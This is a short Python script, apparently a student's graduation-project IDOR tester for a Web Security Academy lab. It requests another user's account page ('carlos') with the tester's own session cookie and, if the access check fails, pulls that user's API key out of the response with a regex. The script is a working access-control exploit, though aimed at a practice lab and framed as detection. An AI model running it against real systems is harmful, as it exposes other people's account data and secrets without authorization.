#!/usr/bin/env python3
# """
#   IDOR自动化测试脚本 - 基础版
#   作者：[你的名字]
#   用途：毕业设计 - IDOR漏洞检测系统
# """

import requests
import sys

# 配置
TARGET_URL = "https://your-lab-id.web-security-academy.net/accountDetails"
SESSION_COOKIE = "session=你的session值"

def test_idor(user_id):
    """
    测试单个用户ID是否存在IDOR漏洞
    
    参数：
        user_id: 要测试的用户ID
    
    返回：
        (status_code, response_length, response_text)
    """
    # 设置请求参数
    params = {"id": user_id}

    # 设置Cookie（身份凭证）
    headers = {
        "Cookie": SESSION_COOKIE,
        "User-Agent": "IDOR-Scanner/1.0"
    }

    try:
        # 发送GET请求
        response = requests.get(
            TARGET_URL,
            params=params,
            headers=headers,
            timeout=10,
            allow_redirects=False  # 不自动跟随重定向
        )

        return (
            response.status_code,
            len(response.text),
            response.text
        )

    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {e}")
        return (None, None, None)

def main():
    print("[*] IDOR漏洞自动化检测工具")
    print("[*] 目标: " + TARGET_URL)
    print("-" * 50)

    # 测试当前用户（基线）
    print("[+] 测试当前用户: wiener")
    status1, length1, text1 = test_idor("wiener")
    print(f"    状态码: {status1}, 响应长度: {length1}")

    # 测试目标用户（IDOR测试）
    print("[+] 测试目标用户: carlos")
    status2, length2, text2 = test_idor("carlos")
    print(f"    状态码: {status2}, 响应长度: {length2}")

    # 分析结果
    print("\n[*] 分析结果:")
    if status2 == 200 and length2 > 100:
        print("[!] 可能存在IDOR漏洞！")
        print(f"[!] 成功获取用户 carlos 的数据")

        # 提取API Key（如果存在）
        if "Your API Key is:" in text2:
            import re
            api_key = re.search(r'Your API Key is: (\w+)', text2)
            if api_key:
                print(f"[+] API Key: {api_key.group(1)}")

    elif status2 == 403:
        print("[✓] 有授权检查，返回403 Forbidden")
    elif status2 == 404:
        print("[?] 返回404，可能用户不存在或有授权检查")
    elif status2 == 302:
        print("[?] 返回302重定向，需要进一步分析")
    else:
        print(f"[?] 未知响应: {status2}")

if __name__ == "__main__":
    main()
